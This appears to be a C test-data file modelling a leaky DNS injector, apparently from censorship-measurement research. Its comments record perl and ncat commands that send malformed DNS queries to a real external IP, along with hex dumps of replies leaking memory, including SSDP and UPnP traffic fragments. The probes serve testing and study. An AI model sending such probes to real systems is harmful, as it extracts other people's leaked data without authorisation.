// TEST sets udp_len = query_len.
#define TEST(query, uses_digest, expected) {(query), sizeof(query)-1, sizeof(query)-1, (expected), sizeof(expected)-1, (uses_digest)}
// TEST_UDPLEN sets udp_len = query_len + udp_increment. udp_len is exclusive
// of the 8-byte UDP header.
#define TEST_UDPLEN(query, udp_increment, uses_digest, expected) {(query), sizeof(query)-1, sizeof(query)-1 + (udp_increment), (expected), sizeof(expected)-1, (uses_digest)}

/* Well-formed A queries. */
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x07" "example" "\x03" "com" "\x00" "\x00\x01\x00\x01", true,
	""
),


/* Well-formed AAAA queries. */
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x1c\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x1c\x00\x01" AAAA_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x1c\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x1c\x00\x01" AAAA_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x07" "example" "\x03" "com" "\x00" "\x00\x1c\x00\x01", true,
	""
),

/* QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT are ignored. */
// QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT all zero.
TEST(
	"\x00\x00\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),
// QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT all > 1.
TEST(
	"\x00\x00\x01\x20\x01\x02\x03\x04\x05\x06\x07\x08" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),

// No null terminator means an end-anchored pattern doesn't match.
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\xff" "com", true,
	""
),
// A final label that ends exactly after the end of the message does not need a
// null terminator empty label.
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\x03" "com" "DDDD" "X" A_SUFFIX
),
// Null terminator present means an end-anchored pattern matches.
/*
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 08 66 61 63   ... .... .....fac
[0010]   65 62 6F 6F 6B FF 63 6F   6D 00                     ebook.co m.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 08 66 61 63   ........ .....fac
[0010]   65 62 6F 6F 6B FF 63 6F   6D 00 A1 4D 40 58 2E 32   ebook.co m..M@X.2
[0020]   35 35 2E 32 35 35 2E 32   35 30 3A 31 39 30 30 0D   55.255.2 50:1900.
[0030]   0A 4D 41 4E 3A 20 22 73   73 64 70 3A 64 69 73 63   .MAN: "s sdp:disc
[0040]   6F 76 65 72 22 0D 0A 4D   58 3A 20 32 0D 0A 53 54   over"..M X: 2..ST
[0050]   3A 20 73 73 64 70 3A 61   6C 6C 0D 0A 0D 0A C0 AD   : ssdp:a ll......
[0060]   87 0E 23 23 1F 26 32 5C   BC BA 6F 28 1C 17 14 19   ..##.&2\ ..o(....
[0070]   21 3E BB AC B0 52 2E 34   48 B5 A3 9C 97 98 9A A7   !>...R.4 H.......
[0080]   C6 CE CF BC A9 9C 96 99   9D AF 34 1F 1B 1D C0 0C   ........ ..4.....
[0090]   00 01 00 01 00 00 00 9B   00 04 80 F2 F0 55         ........ .....U
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\xff" "com" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\xff" "com" "\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
// Combine ending exactly after the end of the message with an embedded dot in
// the label.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x07rsf.org"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
0000   33 33 01 20 00 01 00 00  00 00 00 00 07 72 73 66  33...........rsf
0010   2e 6f 72 67                                       .org
0000   33 33 81 80 00 01 00 01  00 00 00 00 07 72 73 66  33...........rsf
0010   2e 6f 72 67 1f 95 76 f2  dd c0 0c 00 01 00 01 00  .org..v.........
0020   00 00 77 00 04 68 f4 2e  5d                       ..w..h..]
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x07" "rsf.org", false,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x07" "rsf.org" "XXXXX" A_SUFFIX
),
// This one doesn't get a response, because the final length label ('\x1f') is
// not exactly 1 byte past the end of the query, so the effective QNAME is
// rsf.org.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX, where there are 0x1f 'X's.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x07rsf.org\x1f"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
0000   33 33 01 20 00 01 00 00  00 00 00 00 07 72 73 66  33...........rsf
0010   2e 6f 72 67 1f                                    .org.
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x07" "rsf.org" "\x1f", false,
	""
),
// This one doesn't get a response, because the effective QNAME is
// "rsf\x03org", which does not match anything on the blocklist.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x07rsf\x03org"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
0000   33 33 01 20 00 01 00 00  00 00 00 00 07 72 73 66  33...........rsf
0010   03 6f 72 67                                       .org
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x07" "rsf" "\x03" "org", false,
	""
),

// shaving bytes from the end
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01\x00" "D" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00\x01" "DD" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "\x00" "DDD" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x00" "DDDD" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "DDDD" "X" A_SUFFIX
),

// QTYPE=AAAA, but it's below the 127 threshold, so the AAAA is
// considered part of a label and the response defaults to A.
/*
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 02 36 39 02   ... .... .....69.
[0010]   6D 75 77 00 1C                                      muw..
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 02 36 39 02   ........ .....69.
[0010]   6D 75 77 00 1C 88 E6 D1   A1 D3 E2 55 DF F3 7E F1   muw..... ...U..~.
[0020]   00 00 00 01 94 C6 03 02   00 00 00 00 00 00 00 00   ........ ........
[0030]   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0040]   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0050]   00 00 45 3D 00 00 45 3D   00 00 01 80 00 00 00 01   ..E=..E= ........
[0060]   17 6C 65 70 DF F3 7E F1   00 00 00 01 C6 E6 03 02   .lep..~. ........
[0070]   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0080]   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 C0   ........ ........
[0090]   0C 00 01 00 01 00 00 00   BF 00 04 C7 3B 94 93      ........ ....;..
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x77" "\x00\x1c", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x77" "\x00\x1c" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
// Increasing \x77 to \x78 causes the QTYPE=AAAA to be
// interpreted.
/*
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 02 36 39 02   ... .... .....69.
[0010]   6D 75 78 00 1C                                      mux..
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 02 36 39 02   ........ .....69.
[0010]   6D 75 78 00 1C F9 40 BE   9C 3A 20 32 33 39 2E 32   mux...@. .: 239.2
[0020]   35 35 2E 32 35 35 2E 32   35 30 3A 31 39 30 30 0D   55.255.2 50:1900.
[0030]   0A 4D 41 4E 3A 20 22 73   73 64 70 3A 64 69 73 63   .MAN: "s sdp:disc
[0040]   6F 76 65 72 22 0D 0A 4D   58 3A 20 32 0D 0A 53 54   over"..M X: 2..ST
[0050]   3A 20 73 73 64 70 3A 61   6C 6C 0D 0A 0D 0A 82 15   : ssdp:a ll......
[0060]   DB 00 32 1F 3D B4 FE F8   60 6A E1 CE 1C CC CD FA   ..2.=... `j......
[0070]   0B 6A 67 9F 13 D5 FA DA   89 9A 20 8E 80 D7 EF E5   .jg..... .. .....
[0080]   94 56 9E 00 B7 7B E4 0D   6A 59 34 C0 8A D0 C0 0C   .V...{.. jY4.....
[0090]   00 1C 00 01 00 00 00 97   00 10 20 01 00 00 00 00   ........ .. .....
[00a0]   00 00 00 00 00 00 D1 55   9F 89                     .......U ..
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x78" "\x00\x1c", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "69" "\x02" "mu" "\x78" "\x00\x1c" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" AAAA_SUFFIX
),


// Embedded '.' rather than proper label separator.
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x0569.mu"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 05 36 39 2E   ... .... .....69.
[0010]   6D 75                                               mu
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 05 36 39 2E   ........ .....69.
[0010]   6D 75 BB 10 96 D0 BB C0   0C 00 01 00 01 00 00 00   mu...... ........
[0020]   9F 00 04 4B 7E 21 9C                                ...K~!.
Without digest:
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 05 36 39 2E   ........ .....69.
[0010]   6D 75                                               mu
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 05 36 39 2E   ........ .....69.
[0010]   6D 75 41 43 48 45 2D C0   0C 00 01 00 01 00 00 00   muACHE-. ........
[0020]   66 00 04 A2 7D 02 06                                f...}..
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x05" "69.mu", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x05" "69.mu" "DDDD" "X" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x05" "69.mu", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x05" "69.mu" "XXXXX" A_SUFFIX
),
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xff69.mu\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 FF 36 39 2E   ... .... .....69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 FF 36 39 2E   ........ .....69.
[0010]   6D 75 00 64 AB A7 E1 43   4F 4E 54 52 4F 4C 3A 20   mu.d...C ONTROL:
[0020]   6D 61 78 2D 61 67 65 20   3D 20 31 32 30 0D 0A 45   max-age  = 120..E
[0030]   58 54 3A 20 0D 0A 4C 4F   43 41 54 49 4F 4E 3A 20   XT: ..LO CATION:
[0040]   68 74 74 70 3A 2F 2F 31   39 32 2E 31 36 38 2E 31   http://1 92.168.1
[0050]   2E 31 3A 38 30 2F 55 50   6E 50 2F 49 47 44 2E 78   .1:80/UP nP/IGD.x
[0060]   6D 6C 0D 0A 53 54 3A 20   75 75 69 64 3A 49 47 44   ml..ST:  uuid:IGD
[0070]   7B 38 63 38 30 66 37 33   66 2D 34 62 61 30 2D 34   {8c80f73 f-4ba0-4
[0080]   35 66 61 2D 38 33 35 64   2D 30 34 32 35 30 C0 0C   5fa-835d -04250..
[0090]   00 01 00 01 00 00 00 BC   00 04 1F 0D 5E 25         ........ ....^%
Without digest:
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 FF 36 39 2E   ........ .....69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 FF 36 39 2E   ........ .....69.
[0010]   6D 75 00 0D 0A 48 6F 73   74 3A 32 33 39 2E 32 35   mu...Hos t:239.25
[0020]   35 2E 32 35 35 2E 32 35   30 3A 31 39 30 30 0D 0A   5.255.25 0:1900..
[0030]   53 54 3A 73 73 64 70 3A   61 6C 6C 0D 0A 4D 61 6E   ST:ssdp: all..Man
[0040]   3A 22 73 73 64 70 3A 64   69 73 63 6F 76 65 72 22   :"ssdp:d iscover"
[0050]   0D 0A 4D 58 3A 33 0D 0A   0D 0A 01 BD C0 10 C1 DB   ..MX:3.. ........
[0060]   1E 35 F5 68 01 CF 7D B1   95 F1 4E 4F 0B 62 8B 6D   .5.h..}. ..NO.b.m
[0070]   96 8A E3 6F C4 F8 8D 82   40 CA D3 92 46 A0 05 08   ...o.... @...F...
[0080]   07 90 A1 C5 80 A5 2A C8   2A 7B A6 65 74 00 C0 0C   ......*. *{.et...
[0090]   00 01 00 01 00 00 00 BE   00 04 6B B5 A6 F4         ........ ..k...
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\xff" "69.mu" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\xff" "69.mu" "\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\xff" "69.mu" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\xff" "69.mu" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x7769.mu\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 77 36 39 2E   ... .... ....w69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 77 36 39 2E   ........ ....w69.
[0010]   6D 75 00 37 10 4E DB 43   4F 4E 54 52 4F 4C 3A 20   mu.7.N.C ONTROL:
[0020]   6D 61 78 2D 61 67 65 20   3D 20 31 32 30 0D 0A 45   max-age  = 120..E
[0030]   58 54 3A 20 0D 0A 4C 4F   43 41 54 49 4F 4E 3A 20   XT: ..LO CATION:
[0040]   68 74 74 70 3A 2F 2F 31   39 32 2E 31 36 38 2E 31   http://1 92.168.1
[0050]   2E 31 3A 38 30 2F 55 50   6E 50 2F 49 47 44 2E 78   .1:80/UP nP/IGD.x
[0060]   6D 6C 0D 0A 53 54 3A 20   75 72 6E 3A 73 63 68 65   ml..ST:  urn:sche
[0070]   6D 61 73 2D 75 70 6E 70   2D 6F 72 67 3A 64 65 76   mas-upnp -org:dev
[0080]   69 63 65 3A 57 41 4E 44   65 C0 0C 00 01 00 01 00   ice:WAND e.......
[0090]   00 00 83 00 04 4B 7E 7C   A2                        .....K~| .
Without digest:
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 77 36 39 2E   ........ ....w69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 77 36 39 2E   ........ ....w69.
[0010]   6D 75 00 0D 0A 48 4F 53   54 3A 20 32 33 39 2E 32   mu...HOS T: 239.2
[0020]   35 35 2E 32 35 35 2E 32   35 30 3A 31 39 30 30 0D   55.255.2 50:1900.
[0030]   0A 4D 41 4E 3A 20 22 73   73 64 70 3A 64 69 73 63   .MAN: "s sdp:disc
[0040]   6F 76 65 72 22 0D 0A 4D   58 3A 20 32 0D 0A 53 54   over"..M X: 2..ST
[0050]   3A 20 73 73 64 70 3A 61   6C 6C 0D 0A 0D 0A 95 B5   : ssdp:a ll......
[0060]   A6 C3 AC 5C 5B B7 44 37   E7 15 01 6B 1B 28 B5 5C   ...\[.D7 ...k.(.\
[0070]   B1 F7 AC 5E C6 72 1C C9   5B 4F 55 52 7F C6 E0 0A   ...^.r.. [OUR....
[0080]   67 42 59 FA DD 2A 76 9D   9B C0 0C 00 01 00 01 00   gBY..*v. ........
[0090]   00 00 F0 00 04 1F 0D 60   C2                        .......` .
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x77" "69.mu" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x77" "69.mu" "\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x77" "69.mu" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x77" "69.mu" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x7869.mu\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 78 36 39 2E   ... .... ....x69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 78 36 39 2E   ........ ....x69.
[0010]   6D 75 00 04 AD 87 AD 3A   20 43 75 73 74 6F 6D 2F   mu.....:  Custom/
[0020]   31 2E 30 20 55 50 6E 50   2F 31 2E 30 20 50 72 6F   1.0 UPnP /1.0 Pro
[0030]   63 2F 56 65 72 0D 0A 45   58 54 3A 0D 0A 4C 6F 63   c/Ver..E XT:..Loc
[0040]   61 74 69 6F 6E 3A 20 68   74 74 70 3A 2F 2F 31 39   ation: h ttp://19
[0050]   32 2E 31 36 38 2E 31 2E   31 3A 35 34 33 31 2F 64   2.168.1. 1:5431/d
[0060]   79 6E 64 65 76 2F 75 75   69 64 3A 61 31 30 66 61   yndev/uu id:a10fa
[0070]   35 65 34 2D 39 61 34 36   2D 34 62 39 31 2D 62 36   5e4-9a46 -4b91-b6
[0080]   62 35 2D 38 36 36 66 32   64 66 C0 0C 00 01 00 01   b5-866f2 df......
[0090]   00 00 00 B8 00 04 CA 35   89 D1                     .......5 ..
Without digest:
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 78 36 39 2E   ........ ....x69.
[0010]   6D 75 00                                            mu.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 78 36 39 2E   ........ ....x69.
[0010]   6D 75 00 43 48 45 2D 43   4F 4E 54 52 4F 4C 3A 20   mu.CHE-C ONTROL:
[0020]   6D 61 78 2D 61 67 65 20   3D 20 31 32 30 0D 0A 45   max-age  = 120..E
[0030]   58 54 3A 20 0D 0A 4C 4F   43 41 54 49 4F 4E 3A 20   XT: ..LO CATION:
[0040]   68 74 74 70 3A 2F 2F 31   39 32 2E 31 36 38 2E 31   http://1 92.168.1
[0050]   31 2E 31 3A 38 30 2F 55   50 6E 50 2F 49 47 44 2E   1.1:80/U PnP/IGD.
[0060]   78 6D 6C 0D 0A 53 54 3A   20 75 72 6E 3A 73 63 68   xml..ST:  urn:sch
[0070]   65 6D 61 73 2D 75 70 6E   70 2D 6F 72 67 3A 73 65   emas-upn p-org:se
[0080]   72 76 69 63 65 3A 57 41   4E 43 C0 0C 00 01 00 01   rvice:WA NC......
[0090]   00 00 00 CA 00 04 CA A0   80 60                     ........ .`
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x78" "69.mu" "\x00", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x78" "69.mu" "\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x78" "69.mu" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x78" "69.mu" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),

/*
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 05 36 39 2E   ... .... .....69.
[0010]   6D 75 68                                            muh
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 05 36 39 2E   ........ .....69.
[0010]   6D 75 68 98 EF DF EB 43   4F 4E 54 52 4F 4C 3A 20   muh....C ONTROL:
[0020]   6D 61 78 2D 61 67 65 20   3D 20 31 32 30 0D 0A 45   max-age  = 120..E
[0030]   58 54 3A 20 0D 0A 4C 4F   43 41 54 49 4F 4E 3A 20   XT: ..LO CATION:
[0040]   68 74 74 70 3A 2F 2F 31   39 32 2E 31 36 38 2E 31   http://1 92.168.1
[0050]   36 2E 31 3A 38 30 2F 55   50 6E 50 2F 49 47 44 2E   6.1:80/U PnP/IGD.
[0060]   78 6D 6C 0D 0A 53 54 3A   20 75 72 6E 3A 73 63 68   xml..ST:  urn:sch
[0070]   65 6D 61 73 2D 75 70 6E   70 2D 6F 72 67 3A 73 65   emas-upn p-org:se
[0080]   C0 0C 00 01 00 01 00 00   00 E4 00 04 68 F4 2E F6   ........ ....h...
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x05" "69.mu" "\x68", true,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x05" "69.mu" "\x68" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),

/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x03rsf\x03org"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 03 72 73 66   33. .... .....rsf
[0010]   03 6F 72 67                                         .org
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 03 72 73 66   33...... .....rsf
[0010]   03 6F 72 67 1E 98 81 F8   01 C0 0C 00 01 00 01 00   .org.... ........
[0020]   00 00 45 00 04 C7 60 3F   4B                        ..E...`? K
Without digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 03 72 73 66   33. .... .....rsf
[0010]   03 6F 72 67                                         .org
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 03 72 73 66   33...... .....rsf
[0010]   03 6F 72 67 48 45 2D 43   4F C0 0C 00 01 00 01 00   .orgHE-C O.......
[0020]   00 00 6B 00 04 9D F0 02   24                        ..k..... $
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x03" "org", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x03" "org" "DDDD" "X" A_SUFFIX
),
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x03" "rsf" "\x03" "org", false,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x03" "rsf" "\x03" "org" "XXXXX" A_SUFFIX
),


/* Tests for names whose string representation has a length close to 126. */

// Subdomain of facebook.com should be matched. Note: this query also gets a
// response from an injector other than the leaky one.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x10aaaaaaaaaaaaaaaa\x08facebook\x03com\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 10 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0020]   63 65 62 6F 6F 6B 03 63   6F 6D 00 00 01 00 01      cebook.c om.....
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 10 61 61 61   33...... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0020]   63 65 62 6F 6F 6B 03 63   6F 6D 00 00 01 00 01 C0   cebook.c om......
[0030]   0C 00 01 00 01 00 00 00   9A 00 04 6C A0 A9 B2      ........ ...l...
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x10" "aaaaaaaaaaaaaaaa" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x10" "aaaaaaaaaaaaaaaa" "\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),
// Names of length up to 125 that end in ".facebook.com" should be matched.
